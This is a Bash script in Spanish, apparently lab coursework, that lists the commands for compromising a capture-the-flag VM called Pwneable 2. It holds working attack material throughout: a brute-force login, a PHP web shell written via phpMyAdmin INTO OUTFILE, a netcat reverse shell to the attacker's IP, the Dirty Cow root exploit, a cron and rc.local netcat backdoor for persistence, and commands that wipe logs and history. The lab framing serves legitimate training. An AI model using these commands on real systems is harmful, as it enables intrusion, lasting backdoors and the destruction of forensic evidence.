#!/bin/bash

# ===============================================
# Actividad 4 - DDLR Pwneable 2: Comandos de Hacking Ético
# Extracción de comandos del documento Actividad 4 - DDLR Pwneable 2.pdf
# ===============================================

# Variables de Configuración (Ajustar según la red)
TARGET_IP="192.168.100.51"
ATTACKER_IP="192.168.100.12"
LISTENER_PORT="4444"
WORDLIST_PATH="/path/to/dicts/wordlists/rockyou.txt"

## 1. Descubrimiento y Reconocimiento
echo "--- 1. Descubrimiento de IP y Puertos ---"

# Escaneo para encontrar la IP de la máquina en la red local
# nmap -sn 192.168.100.0/24
# Comando para escanear la red y buscar hosts con servicio HTTP
# nmap -sn 192.168.100.0/24 | grep 'report' | cut -d " " -f5 | xargs -I {} curl -s -o/dev/null -w "%{url_effective} HTTP %{http_code}\n" {}

# Escaneo de puertos en la IP objetivo
# nmap -sV $TARGET_IP

echo -e "\n--- 2. Descubrimiento de Directorios (Gobuster) ---"
# Escaneo de directorios de la web
gobuster dir -u "http://$TARGET_IP" -w "/path/to/dicts/wordlists/dirb/big.txt" -t 5000 -q --status-codes-blacklist 404,403,402

## 3. Explotación (Brute-Force Login)
echo -e "\n--- 3. Explotación de Brute-Force en Login (Usando script del PoC) ---"
# El script se ejecuta con los siguientes parámetros (ejemplo):
# Enter URL: http://192.168.100.51/login.php
# Enter username: virus
# Enter Failure String: a incorrecta
# Form is POST or GET? (POST/GET): POST
# Username var: usuario
# Password var: password
# Comando de ejecución:
# ./lab/b.sh < $WORDLIST_PATH

# Resultado del login exitoso: usuario 'virus', contraseña '1234qwe'

## 4. Explotación MySQL (PHPMyAdmin INTO OUTFILE)
echo -e "\n--- 4. PHPMyAdmin Into OUTFILE para Command Execution ---"
# Acceso a PHPMyAdmin con 'root' / '1234qwe'

# Inserción de la shell PHP en la tabla 'testing' (ejecutar en la interfaz Insert):
# <?php $r = system($_GET["c"]); echo $r; echo "<form> <input type=hidden name=page value='/tmp/shell.php'><input type=text name=c><input type=submit></form>"; ?>

# Comando SQL para escribir el contenido de la tabla al archivo shell.php (ejecutar en la interfaz SQL):
SELECT * INTO OUTFILE '/tmp/shell.php' FROM testing WHERE 1

# Prueba de la shell por LFI (Local File Inclusion)
# Acceder en el navegador: http://$TARGET_IP/admin.php?page=/tmp/shell.php&c=whoami

## 5. Escalada de Shell y Privilegios
echo -e "\n--- 5. Escalada a Reverse Shell y Local Privilege Escalation ---"

# 5.1. Configurar listener en la máquina del atacante:
# nc -lvnp $LISTENER_PORT

# 5.2. Ejecutar reverse shell desde la shell web (sustituir $ATTACKER_IP):
$(which nc) -e/bin/bash $ATTACKER_IP $LISTENER_PORT

# 5.3. Mejorar la shell después de la conexión:
script /dev/null -c bash
export TERM=xterm
export SHELL=bash

# 5.4. Buscar binarios SUID (útil para enumeración):
find / -perm -4000 -type f 2>/dev/null

# 5.5. Explotar Dirty Cow (CVE-2016-5195)
# Descarga del exploit de firefart (que crea el usuario 'toor')
wget https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c

# Compilación del exploit
gcc -pthread dirty.c -o dirty_cow -lcrypt

# Ejecución del exploit (pedirá el nuevo password, ej: 'aguagu')
# ./dirty_cow

# 5.6. Acceso SSH como Root (toor/aguagu)
# ssh toor@$TARGET_IP

# 5.7. Restauración del /etc/passwd después de la explotación (IMPORTANTE):
# mv /tmp/passwd.bak /etc/passwd

## 6. Persistencia (Como root)
echo -e "\n--- 6. Persistencia (@reboot con Cron) ---"

# 6.1. Creación del script de persistencia en /bin/alvlgeddl
# #!/bin/bash
# while true; do
# nc -l -p 21 -e '/bin/bash'
# done

# 6.2. Configurar tarea cron para ejecutar en cada reinicio (usar EDITOR=vim crontab -e):
@reboot /bin/alvlgeddl

# 6.3. Persistencia adicional con /etc/rc.local
# Añadir la línea al final de /etc/rc.local (antes de exit 0):
/bin/alvlgeddl &

## 7. Flag Root
echo -e "\n--- 7. Flag de Root ---"
# cat flag.txt
# th3ddlr-academy-fl4g

## 8. Log Zapping (Limpieza de Vestigios)
echo -e "\n--- 8. Log Zapping (Limpieza Final) ---"

# 8.1. Limpieza de IPs (Ejecutar con permisos de root para reemplazar IP en todos los archivos con permisos)
# Reemplazar $ATTACKER_IP (192.168.100.12) por 0.0.0.0
find / -type f -exec sed -i 's/$ATTACKER_IP/0.0.0.0/g' {} + 2>/dev/null

# 8.2. Comando para identificar archivos que contienen la IP (para limpieza manual o verificación)
# find / -type f -print | xargs -0 grep -lF '$ATTACKER_IP' 2>/dev/null

# 8.3. Comando para identificar archivos que contienen el usuario temporal 'toor'
# find / -type f -print | xargs -0 grep -lF 'toor' 2>/dev/null

# 8.4. Limpieza de .bash_history de /root (eliminar comandos de la sesión actual)
# truncate -s 0 /root/.bash_history

# 8.5. Limpieza de logs binarios como wtmp y lastlog (método de edición 'vim' en el PDF)
# Los archivos binarios como /var/log/wtmp y /var/log/lastlog requieren edición especializada (vim o 'lastlog -C')
# La limpieza en vim se indica con: :%s/$ATTACKER_IP/0.0.0.0/g
